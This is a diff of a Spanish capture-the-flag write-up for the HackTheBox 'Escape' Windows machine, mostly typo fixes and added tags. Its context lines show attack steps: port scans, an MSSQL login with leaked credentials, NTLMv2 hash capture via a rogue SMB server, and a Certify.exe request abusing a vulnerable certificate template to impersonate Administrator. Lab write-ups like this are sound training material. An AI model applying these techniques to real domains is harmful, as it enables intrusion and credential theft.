@@ -3,19 +3,19 @@ title: Escape WriteUp
 author: H4ckerLite 
 date: 2023-04-03 00:00:00 +0800
 categories: [hackthebox, machine, writeup]
-tags: [windows, hackthebox, writeup, medium]
+tags: [windows, hackthebox, writeup, medium, certify, rubeus, DC, smbclient, evil-winrm]
 image:
   path: ../../assets/img/commons/escape-writeup/Escape.png 
   alt: Inject WriteUp
 pin: true
 ---
 
-Máquinita Windows de [hackTheBox](), es de dificultad media. Ganarameos acceso al servicio `MSSQL` tramitando una petición a un servidor nuestro `SMB` obtendremos el hash `NTLMv2`
+Máquinita Windows de [HackTheBox](https://app.hackthebox.com/machines/531), es de dificultad media. Ganarameos acceso al servicio `MSSQL` tramitando una petición a un servidor nuestro `SMB` obtendremos el hash `NTLMv2` de un usuario, nos conectamos por `Evil-Winrm` y mediante una contraseña lekeada vemos la contraseña de otro usuario, Para la esclada nos apovecharemos de un certificado vulnerable que nos dará el hash `NTLM`del usuario `Administrator`.
 
 ## Enumeración
 ### Escaneo de puertos
 
-Si realizamos un NMAO Scan, veremos los siguientes puertos.
+Si realizamos un NMAP Scan, veremos los siguientes puertos.
 
 ```bash
 ❯❯ nmap 10.10.11.202
@@ -42,7 +42,7 @@ Nmap done: 1 IP address (1 host up) scanned in 26.54 seconds
 
 Los puertos **53** y **88**  los que nos da a entender que es un dominio. 
 
-Si realizamos un escanoe más profundo vemos.
+Si realizamos un escaneo más profundo vemos.
 
 ```bash
 ❯ nmap 10.10.11.202 -sCV -Pn
@@ -144,7 +144,7 @@ smb: \>
 
 ```
 
-Si lo abrimos en nuestro navegador, v eremos lo siguiente:
+Si lo abrimos en nuestro navegador, veremos lo siguiente:
 
 ![Hacker ]({{ 'assets/img/commons/escape-writeup/2.png' | relative_url }}){: .center-image }
 _PDF_
@@ -152,7 +152,7 @@ _PDF_
 ![Hacker ]({{ 'assets/img/commons/escape-writeup/3.png' | relative_url }}){: .center-image }
 _PDF_
 
-Si observamos se lekea un Uuuario y su contraseña del servicio MSSQL. Nos podemos conectar.
+Si observamos se lekea un usuario y su contraseña del servicio MSSQL. Nos podemos conectar.
 ```bash
 ❯ impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202
 Impacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra
@@ -400,6 +400,8 @@ certify.exe request /ca:<$certificateAuthorityHost> /template:<$vulnerableCertif
 - /ca - Especificamos el servidor de la Autoridad de Certificación al que enviamos la solicitud;
 - /template - Especificamos la plantilla de certificado que debe utilizarse para generar el nuevo certificado;
 - /altname - Especificamos el usuario AD para el que debe generarse el nuevo certificado.
+```
+
 ```bash
 *Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> .\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
 
